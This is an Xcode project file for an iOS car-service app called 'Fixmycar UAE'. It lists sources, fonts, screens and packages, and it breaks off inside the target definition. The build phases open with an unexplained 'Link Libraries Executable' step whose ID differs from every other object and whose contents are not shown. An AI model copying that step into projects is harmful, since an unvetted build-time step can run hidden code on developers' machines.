// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC29D69A2F06A42C00DD3EB2 /* OTPTextField.swift */; };
		BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */; };
		BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B12F06A6CD00DD3EB2 /* FTAnimation+UIView.m */; };
		BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B32F06A6CD00DD3EB2 /* FTUtils+NSObject.m */; };
		BC29D6C12F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B42F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m */; };
		BC29D6C22F06A6CD00DD3EB2 /* FTAnimationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B22F06A6CD00DD3EB2 /* FTAnimationManager.m */; };
		BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17712F0696DE00EDC9AE /* LoginVC.xib */; };
		BC4E17732F0696DE00EDC9AE /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4E17702F0696DE00EDC9AE /* LoginVC.swift */; };
		BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */; };
		BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177C2F06982200EDC9AE /* Satoshi-Light.otf */; };
		BC4E17832F06982200EDC9AE /* Satoshi-BoldItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177A2F06982200EDC9AE /* Satoshi-BoldItalic.otf */; };
		BC4E17842F06982200EDC9AE /* Satoshi-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177E2F06982200EDC9AE /* Satoshi-Medium.otf */; };
		BC4E17852F06982200EDC9AE /* Satoshi-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17802F06982200EDC9AE /* Satoshi-Regular.otf */; };
		BC4E17862F06982200EDC9AE /* Satoshi-LightItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177D2F06982200EDC9AE /* Satoshi-LightItalic.otf */; };
		BC4E17872F06982200EDC9AE /* Satoshi-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17792F06982200EDC9AE /* Satoshi-Bold.otf */; };
		BC4E17882F06982200EDC9AE /* Satoshi-Italic.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177B2F06982200EDC9AE /* Satoshi-Italic.otf */; };
		BC4E17892F06982200EDC9AE /* Satoshi-BlackItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17782F06982200EDC9AE /* Satoshi-BlackItalic.otf */; };
		BC4E178A2F06982200EDC9AE /* Satoshi-MediumItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E177F2F06982200EDC9AE /* Satoshi-MediumItalic.otf */; };
		BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4E178E2F06A15100EDC9AE /* VerifyOtp.xib */; };
		BC4E17902F06A15100EDC9AE /* VerifyOtp.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4E178D2F06A15100EDC9AE /* VerifyOtp.swift */; };
		BC7121952F067F800041E2F7 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BC71218D2F067F800041E2F7 /* Assets.xcassets */; };
		BC7121972F067F800041E2F7 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BC7121902F067F800041E2F7 /* LaunchScreen.storyboard */; };
		BC7121982F067F800041E2F7 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BC7121922F067F800041E2F7 /* Main.storyboard */; };
		BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC71218C2F067F800041E2F7 /* AppDelegate.swift */; };
		BC71219A2F067F800041E2F7 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121932F067F800041E2F7 /* ViewController.swift */; };
		BC7121AC2F067F940041E2F7 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC71219C2F067F940041E2F7 /* Constants.swift */; };
		BC7121AD2F067F940041E2F7 /* UIFont+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A12F067F940041E2F7 /* UIFont+Extention.swift */; };
		BC7121AE2F067F940041E2F7 /* AGDesignable.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A82F067F940041E2F7 /* AGDesignable.swift */; };
		BC7121AF2F067F940041E2F7 /* VideoPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A62F067F940041E2F7 /* VideoPicker.swift */; };
		BC7121B02F067F940041E2F7 /* PickerViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A52F067F940041E2F7 /* PickerViewViewController.swift */; };
		BC7121B12F067F940041E2F7 /* NetConnection.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC71219D2F067F940041E2F7 /* NetConnection.swift */; };
		BC7121B22F067F940041E2F7 /* ImagePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A42F067F940041E2F7 /* ImagePicker.swift */; };
		BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A22F067F940041E2F7 /* UITextField+Extention.swift */; };
		BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC71219F2F067F940041E2F7 /* String+Extention.swift */; };
		BC7121B52F067F940041E2F7 /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC71219B2F067F940041E2F7 /* APIClient.swift */; };
		BC7121B62F067F940041E2F7 /* UIColor+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A02F067F940041E2F7 /* UIColor+Extention.swift */; };
		BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121AA2F067F940041E2F7 /* AppUtilites.swift */; };
		BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7121A92F067F940041E2F7 /* AppConstants.swift */; };
		BC7121BB2F067FB90041E2F7 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BC7121BA2F067FB90041E2F7 /* Alamofire */; };
		BC7121BE2F067FC60041E2F7 /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC7121BD2F067FC60041E2F7 /* SVProgressHUD */; };
		BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = BC7121C02F06804F0041E2F7 /* Localizable.strings */; };
		BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */; };
		BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */; };
		BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */; };
		BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */; };
		BCA894B22F0E0F4200633E20 /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCA894B12F0E0F4200633E20 /* HomeVC.xib */; };
		BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCA894B02F0E0F4200633E20 /* HomeVC.swift */; };
		BCFFF72B2F077482000361B2 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = BCFFF72A2F077482000361B2 /* IQKeyboardManagerSwift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPFieldView.swift; sourceTree = "<group>"; };
		BC29D69A2F06A42C00DD3EB2 /* OTPTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPTextField.swift; sourceTree = "<group>"; };
		BC29D6B12F06A6CD00DD3EB2 /* FTAnimation+UIView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTAnimation+UIView.m"; sourceTree = "<group>"; };
		BC29D6B22F06A6CD00DD3EB2 /* FTAnimationManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FTAnimationManager.m; sourceTree = "<group>"; };
		BC29D6B32F06A6CD00DD3EB2 /* FTUtils+NSObject.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+NSObject.m"; sourceTree = "<group>"; };
		BC29D6B42F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+UIGestureRecognizer.m"; sourceTree = "<group>"; };
		BC29D6B62F06A6CD00DD3EB2 /* FTAnimation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimation.h; sourceTree = "<group>"; };
		BC29D6B72F06A6CD00DD3EB2 /* FTAnimation+UIView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTAnimation+UIView.h"; sourceTree = "<group>"; };
		BC29D6B82F06A6CD00DD3EB2 /* FTAnimationManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimationManager.h; sourceTree = "<group>"; };
		BC29D6B92F06A6CD00DD3EB2 /* FTUtils.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTUtils.h; sourceTree = "<group>"; };
		BC29D6BA2F06A6CD00DD3EB2 /* FTUtils+NSObject.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+NSObject.h"; sourceTree = "<group>"; };
		BC29D6BB2F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+UIGestureRecognizer.h"; sourceTree = "<group>"; };
		BC29D6C32F06A6E100DD3EB2 /* Header-Fixmycar.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Header-Fixmycar.h"; sourceTree = "<group>"; };
		BC4E17702F0696DE00EDC9AE /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
		BC4E17712F0696DE00EDC9AE /* LoginVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoginVC.xib; sourceTree = "<group>"; };
		BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Black.otf"; sourceTree = "<group>"; };
		BC4E17782F06982200EDC9AE /* Satoshi-BlackItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-BlackItalic.otf"; sourceTree = "<group>"; };
		BC4E17792F06982200EDC9AE /* Satoshi-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Bold.otf"; sourceTree = "<group>"; };
		BC4E177A2F06982200EDC9AE /* Satoshi-BoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-BoldItalic.otf"; sourceTree = "<group>"; };
		BC4E177B2F06982200EDC9AE /* Satoshi-Italic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Italic.otf"; sourceTree = "<group>"; };
		BC4E177C2F06982200EDC9AE /* Satoshi-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Light.otf"; sourceTree = "<group>"; };
		BC4E177D2F06982200EDC9AE /* Satoshi-LightItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-LightItalic.otf"; sourceTree = "<group>"; };
		BC4E177E2F06982200EDC9AE /* Satoshi-Medium.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Medium.otf"; sourceTree = "<group>"; };
		BC4E177F2F06982200EDC9AE /* Satoshi-MediumItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-MediumItalic.otf"; sourceTree = "<group>"; };
		BC4E17802F06982200EDC9AE /* Satoshi-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Regular.otf"; sourceTree = "<group>"; };
		BC4E178D2F06A15100EDC9AE /* VerifyOtp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VerifyOtp.swift; sourceTree = "<group>"; };
		BC4E178E2F06A15100EDC9AE /* VerifyOtp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = VerifyOtp.xib; sourceTree = "<group>"; };
		BC67730A2F067F4500B15653 /* Fixmycar UAE.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Fixmycar UAE.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		BC71218C2F067F800041E2F7 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		BC71218D2F067F800041E2F7 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		BC71218E2F067F800041E2F7 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		BC71218F2F067F800041E2F7 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		BC7121912F067F800041E2F7 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		BC7121932F067F800041E2F7 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		BC71219B2F067F940041E2F7 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
		BC71219C2F067F940041E2F7 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		BC71219D2F067F940041E2F7 /* NetConnection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetConnection.swift; sourceTree = "<group>"; };
		BC71219F2F067F940041E2F7 /* String+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Extention.swift"; sourceTree = "<group>"; };
		BC7121A02F067F940041E2F7 /* UIColor+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extention.swift"; sourceTree = "<group>"; };
		BC7121A12F067F940041E2F7 /* UIFont+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIFont+Extention.swift"; sourceTree = "<group>"; };
		BC7121A22F067F940041E2F7 /* UITextField+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UITextField+Extention.swift"; sourceTree = "<group>"; };
		BC7121A42F067F940041E2F7 /* ImagePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePicker.swift; sourceTree = "<group>"; };
		BC7121A52F067F940041E2F7 /* PickerViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PickerViewViewController.swift; sourceTree = "<group>"; };
		BC7121A62F067F940041E2F7 /* VideoPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPicker.swift; sourceTree = "<group>"; };
		BC7121A82F067F940041E2F7 /* AGDesignable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AGDesignable.swift; sourceTree = "<group>"; };
		BC7121A92F067F940041E2F7 /* AppConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
		BC7121AA2F067F940041E2F7 /* AppUtilites.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppUtilites.swift; sourceTree = "<group>"; };
		BC7121C12F06804F0041E2F7 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		BC7121C32F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
		BC7121C42F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Main.strings; sourceTree = "<group>"; };
		BC7121C52F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
		BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAccountVC.swift; sourceTree = "<group>"; };
		BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateAccountVC.xib; sourceTree = "<group>"; };
		BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecentBookingTVCell.swift; sourceTree = "<group>"; };
		BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RecentBookingTVCell.xib; sourceTree = "<group>"; };
		BCA894B02F0E0F4200633E20 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
		BCA894B12F0E0F4200633E20 /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		BC6773072F067F4500B15653 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BC7121BE2F067FC60041E2F7 /* SVProgressHUD in Frameworks */,
				BC7121BB2F067FB90041E2F7 /* Alamofire in Frameworks */,
				BCFFF72B2F077482000361B2 /* IQKeyboardManagerSwift in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		BC29D6962F06A40400DD3EB2 /* ThirdParty */ = {
			isa = PBXGroup;
			children = (
				BC29D69B2F06A42C00DD3EB2 /* OTPFieldView */,
			);
			path = ThirdParty;
			sourceTree = "<group>";
		};
		BC29D69B2F06A42C00DD3EB2 /* OTPFieldView */ = {
			isa = PBXGroup;
			children = (
				BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */,
				BC29D69A2F06A42C00DD3EB2 /* OTPTextField.swift */,
			);
			path = OTPFieldView;
			sourceTree = "<group>";
		};
		BC29D6B52F06A6CD00DD3EB2 /* Classes */ = {
			isa = PBXGroup;
			children = (
				BC29D6B12F06A6CD00DD3EB2 /* FTAnimation+UIView.m */,
				BC29D6B22F06A6CD00DD3EB2 /* FTAnimationManager.m */,
				BC29D6B32F06A6CD00DD3EB2 /* FTUtils+NSObject.m */,
				BC29D6B42F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m */,
			);
			path = Classes;
			sourceTree = "<group>";
		};
		BC29D6BC2F06A6CD00DD3EB2 /* FTUtils */ = {
			isa = PBXGroup;
			children = (
				BC29D6B62F06A6CD00DD3EB2 /* FTAnimation.h */,
				BC29D6B72F06A6CD00DD3EB2 /* FTAnimation+UIView.h */,
				BC29D6B82F06A6CD00DD3EB2 /* FTAnimationManager.h */,
				BC29D6B92F06A6CD00DD3EB2 /* FTUtils.h */,
				BC29D6BA2F06A6CD00DD3EB2 /* FTUtils+NSObject.h */,
				BC29D6BB2F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.h */,
			);
			path = FTUtils;
			sourceTree = "<group>";
		};
		BC29D6BD2F06A6CD00DD3EB2 /* Headers */ = {
			isa = PBXGroup;
			children = (
				BC29D6BC2F06A6CD00DD3EB2 /* FTUtils */,
			);
			path = Headers;
			sourceTree = "<group>";
		};
		BC29D6BE2F06A6CD00DD3EB2 /* FTUtils */ = {
			isa = PBXGroup;
			children = (
				BC29D6B52F06A6CD00DD3EB2 /* Classes */,
				BC29D6BD2F06A6CD00DD3EB2 /* Headers */,
			);
			path = FTUtils;
			sourceTree = "<group>";
		};
		BC4E176C2F0696A700EDC9AE /* Login */ = {
			isa = PBXGroup;
			children = (
				BC4E176D2F0696BF00EDC9AE /* View */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		BC4E176D2F0696BF00EDC9AE /* View */ = {
			isa = PBXGroup;
			children = (
				BC4E17702F0696DE00EDC9AE /* LoginVC.swift */,
				BC4E17712F0696DE00EDC9AE /* LoginVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		BC4E17742F06980F00EDC9AE /* Resource */ = {
			isa = PBXGroup;
			children = (
				BC4E17752F06981600EDC9AE /* Font */,
				BC29D6BE2F06A6CD00DD3EB2 /* FTUtils */,
			);
			path = Resource;
			sourceTree = "<group>";
		};
		BC4E17752F06981600EDC9AE /* Font */ = {
			isa = PBXGroup;
			children = (
				BC4E17762F06981900EDC9AE /* Satoshi */,
			);
			path = Font;
			sourceTree = "<group>";
		};
		BC4E17762F06981900EDC9AE /* Satoshi */ = {
			isa = PBXGroup;
			children = (
				BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */,
				BC4E17782F06982200EDC9AE /* Satoshi-BlackItalic.otf */,
				BC4E17792F06982200EDC9AE /* Satoshi-Bold.otf */,
				BC4E177A2F06982200EDC9AE /* Satoshi-BoldItalic.otf */,
				BC4E177B2F06982200EDC9AE /* Satoshi-Italic.otf */,
				BC4E177C2F06982200EDC9AE /* Satoshi-Light.otf */,
				BC4E177D2F06982200EDC9AE /* Satoshi-LightItalic.otf */,
				BC4E177E2F06982200EDC9AE /* Satoshi-Medium.otf */,
				BC4E177F2F06982200EDC9AE /* Satoshi-MediumItalic.otf */,
				BC4E17802F06982200EDC9AE /* Satoshi-Regular.otf */,
			);
			path = Satoshi;
			sourceTree = "<group>";
		};
		BC4E178B2F06A13B00EDC9AE /* VerifyOtp */ = {
			isa = PBXGroup;
			children = (
				BC4E178C2F06A14400EDC9AE /* View */,
			);
			path = VerifyOtp;
			sourceTree = "<group>";
		};
		BC4E178C2F06A14400EDC9AE /* View */ = {
			isa = PBXGroup;
			children = (
				BC4E178D2F06A15100EDC9AE /* VerifyOtp.swift */,
				BC4E178E2F06A15100EDC9AE /* VerifyOtp.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		BC6773012F067F4500B15653 = {
			isa = PBXGroup;
			children = (
				BC7121942F067F800041E2F7 /* Fixmycar UAE */,
				BC67730B2F067F4500B15653 /* Products */,
			);
			sourceTree = "<group>";
		};
		BC67730B2F067F4500B15653 /* Products */ = {
			isa = PBXGroup;
			children = (
				BC67730A2F067F4500B15653 /* Fixmycar UAE.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		BC7121942F067F800041E2F7 /* Fixmycar UAE */ = {
			isa = PBXGroup;
			children = (
				BC71218C2F067F800041E2F7 /* AppDelegate.swift */,
				BC29D6C32F06A6E100DD3EB2 /* Header-Fixmycar.h */,
				BC29D6962F06A40400DD3EB2 /* ThirdParty */,
				BC4E17742F06980F00EDC9AE /* Resource */,
				BC7121EA2F06964F0041E2F7 /* Controller */,
				BC7121BF2F0680470041E2F7 /* Localizable */,
				BC71219E2F067F940041E2F7 /* API Manager */,
				BC7121A32F067F940041E2F7 /* Extention */,
				BC7121AB2F067F940041E2F7 /* Helper */,
				BC71218D2F067F800041E2F7 /* Assets.xcassets */,
				BC71218E2F067F800041E2F7 /* Info.plist */,
				BC7121902F067F800041E2F7 /* LaunchScreen.storyboard */,
				BC7121922F067F800041E2F7 /* Main.storyboard */,
				BC7121932F067F800041E2F7 /* ViewController.swift */,
			);
			path = "Fixmycar UAE";
			sourceTree = "<group>";
		};
		BC71219E2F067F940041E2F7 /* API Manager */ = {
			isa = PBXGroup;
			children = (
				BC71219B2F067F940041E2F7 /* APIClient.swift */,
				BC71219C2F067F940041E2F7 /* Constants.swift */,
				BC71219D2F067F940041E2F7 /* NetConnection.swift */,
			);
			path = "API Manager";
			sourceTree = "<group>";
		};
		BC7121A32F067F940041E2F7 /* Extention */ = {
			isa = PBXGroup;
			children = (
				BC71219F2F067F940041E2F7 /* String+Extention.swift */,
				BC7121A02F067F940041E2F7 /* UIColor+Extention.swift */,
				BC7121A12F067F940041E2F7 /* UIFont+Extention.swift */,
				BC7121A22F067F940041E2F7 /* UITextField+Extention.swift */,
			);
			path = Extention;
			sourceTree = "<group>";
		};
		BC7121A72F067F940041E2F7 /* PickerView */ = {
			isa = PBXGroup;
			children = (
				BC7121A42F067F940041E2F7 /* ImagePicker.swift */,
				BC7121A52F067F940041E2F7 /* PickerViewViewController.swift */,
				BC7121A62F067F940041E2F7 /* VideoPicker.swift */,
			);
			path = PickerView;
			sourceTree = "<group>";
		};
		BC7121AB2F067F940041E2F7 /* Helper */ = {
			isa = PBXGroup;
			children = (
				BC7121A72F067F940041E2F7 /* PickerView */,
				BC7121A82F067F940041E2F7 /* AGDesignable.swift */,
				BC7121A92F067F940041E2F7 /* AppConstants.swift */,
				BC7121AA2F067F940041E2F7 /* AppUtilites.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
		BC7121BF2F0680470041E2F7 /* Localizable */ = {
			isa = PBXGroup;
			children = (
				BC7121C02F06804F0041E2F7 /* Localizable.strings */,
			);
			path = Localizable;
			sourceTree = "<group>";
		};
		BC7121EA2F06964F0041E2F7 /* Controller */ = {
			isa = PBXGroup;
			children = (
				BCA894AD2F0E0F2900633E20 /* Tabbar */,
				BC75E8742F0D2C9700947022 /* CreateAccount */,
				BC4E178B2F06A13B00EDC9AE /* VerifyOtp */,
				BC4E176C2F0696A700EDC9AE /* Login */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		BC75E8742F0D2C9700947022 /* CreateAccount */ = {
			isa = PBXGroup;
			children = (
				BC75E8752F0D2CA900947022 /* View */,
			);
			path = CreateAccount;
			sourceTree = "<group>";
		};
		BC75E8752F0D2CA900947022 /* View */ = {
			isa = PBXGroup;
			children = (
				BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */,
				BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		BC98E7C52F0E228200426807 /* Cell */ = {
			isa = PBXGroup;
			children = (
				BC98E7C62F0E228400426807 /* RecentBookingTVCell */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		BC98E7C62F0E228400426807 /* RecentBookingTVCell */ = {
			isa = PBXGroup;
			children = (
				BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */,
				BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */,
			);
			path = RecentBookingTVCell;
			sourceTree = "<group>";
		};
		BCA894AD2F0E0F2900633E20 /* Tabbar */ = {
			isa = PBXGroup;
			children = (
				BCA894AE2F0E0F2D00633E20 /* Home */,
			);
			path = Tabbar;
			sourceTree = "<group>";
		};
		BCA894AE2F0E0F2D00633E20 /* Home */ = {
			isa = PBXGroup;
			children = (
				BC98E7C52F0E228200426807 /* Cell */,
				BCA894AF2F0E0F3000633E20 /* View */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		BCA894AF2F0E0F3000633E20 /* View */ = {
			isa = PBXGroup;
			children = (
				BCA894B02F0E0F4200633E20 /* HomeVC.swift */,
				BCA894B12F0E0F4200633E20 /* HomeVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		BC6773092F067F4500B15653 /* Fixmycar UAE */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
			buildPhases = (
				0ADAC5F412244970BC634D6E /* Link Libraries Executable */,
				BC6773062F067F4500B15653 /* Sources */,
				BC6773072F067F4500B15653 /* Frameworks */,
				BC6773082F067F4500B15653 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Fixmycar UAE";
			packageProductDependencies = (
				BC7121BA2F067FB90041E2F7 /* Alamofire */,
				BC7121BD2F067FC60041E2F7 /* SVProgressHUD */,
				BCFFF72A2F077482000361B2 /* IQKeyboardManagerSwift */,
			);
			productName = "Fixmycar UAE";
			productReference = BC67730A2F067F4500B15653 /* Fixmycar UAE.app */;
